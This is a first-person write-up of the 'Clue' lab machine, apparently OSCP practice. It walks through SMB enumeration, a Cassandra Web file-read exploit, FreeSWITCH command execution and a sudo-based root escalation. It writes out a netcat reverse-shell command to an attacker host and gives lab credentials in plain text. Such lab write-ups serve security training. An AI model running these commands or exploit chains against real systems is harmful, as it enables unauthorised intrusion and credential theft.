---
description: Community Rating:Very hard
---

# Clue

So i started enumeration and found the following services:

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

i start looking at the SMB server with anonymous access:

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

Si i download everything in the backup folder with the following commands:

```
recurse on
prompt off
mget *
```

It had a large amount of files that seemed to be rabbit holes :/&#x20;

then i saw this web service running on port 3000 that seemed very weird:

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Not much going on here but i found a file read vulnerability that looked interesting:

{% embed url="https://www.exploit-db.com/exploits/49362" %}

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

In the poc of the exploit we can see a path that seems valuable:

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption><p>cassie:SecondBiteTheApple330</p></figcaption></figure>

mayBut i can't access ssh with those credentials so i continue my enumeration, while looking at the services at the beginning of the lab i saw a FreeSWITCH service running that had an authenticated exploit so i wanted to try and use those creds to exploit it:

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

So i replaced the password with the one i found but didn' t manage to exploit it so i tried enumerating the default files used by freeswitch to see where the creds are stored

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Nothing in this file so i looked at the exploit to see what i was looking for:

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

I didn't find the full quickly so i asked my litthle GPT friend (very bad since it's not authorized for OSCP but i was hungry and wanted to get my foothold quickly) and i found a file with some credentials:

<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption><p>StrongClueConEight021</p></figcaption></figure>

and i changed the credentials in the exploit.py file and managed to get command execution :tada:

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Ok so i had a REALLY hard time getting a shell, tried reading SSH keys, plenty of reverse shell using different stuff, and finally looked at a WU sadly; i would've never guessed it:

```
python exploit.py 192.168.51.240 'nc -nv 192.168.49.51 3000 -e /bin/bash'
```

This was the payload that got me a shell, i tried other things to try out another route and everything failed, my theory is that since cassandra web is running on port 3000, something goes on on the backend preventing any connections to services ≠ to port 3000

So now that i have a foothold i remember that i had the creds of cassie earlier and can therefor switch users:

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

And i quickly discover that i can run a service called cassandra-web as sudo:

<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

So now i need to use this, i had a hard time understanding what it does exactly, if could get an elavated shell by doing some sort of reverse shell, bind shell or create some sort of admin user to connect to? so i asked my GPT friend once again even tho i think i understood pretty well just to be sure

so i tried running the service with some creds that i created but it does not work

```
sudo /usr/local/bin/cassandra-web -B 0.0.0.0:3000 -u felix -p felix
...
Cassandra::Errors::AuthenticationError: Provided username felix and/or password are incorrect
...
```

So i try with some legit credentials, maybe if i manage to run this as root, i can read the proof.txt file with the file read vulnerability:

```
sudo /usr/local/bin/cassandra-web -B 0.0.0.0:3000 -u cassie -p SecondBiteTheApple330
```

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

then i open a new shell and get a 2nd reverse shell to be able to access localhost service running as root:

<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Then i try and read the proof file:

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

this is worst than a rick roll to me i am so tired of this box

So after trying to guess 300 files that could be valuable (found /etc/shadow that can be cool) i found an ssh key:

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

then i try connecting to users with this key and root seems to tick:

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

so i change the permissions of the key and managed to connect to root:

<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption><p>straight to the next box after eating something</p></figcaption></figure>
